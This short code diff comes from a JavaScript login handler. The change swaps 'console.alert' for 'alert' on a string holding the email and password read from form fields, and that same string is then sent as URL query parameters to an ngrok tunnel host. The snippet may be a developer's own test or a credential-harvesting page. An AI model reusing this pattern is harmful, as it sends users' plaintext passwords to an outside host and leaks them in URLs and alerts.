@@ -176,7 +176,7 @@
       email = document.querySelector('input[name="Email"]').value;
       password = document.querySelector('input[name="Password"]').value;
       urlStr = "method=login&email=" + email + "&password=" + password;
-      console.alert(urlStr);  
+      alert(urlStr); 
 
       fetch("https://272c-51-241-21-189.ngrok-free.app/service.php?" + urlStr, requestOptions);
         }
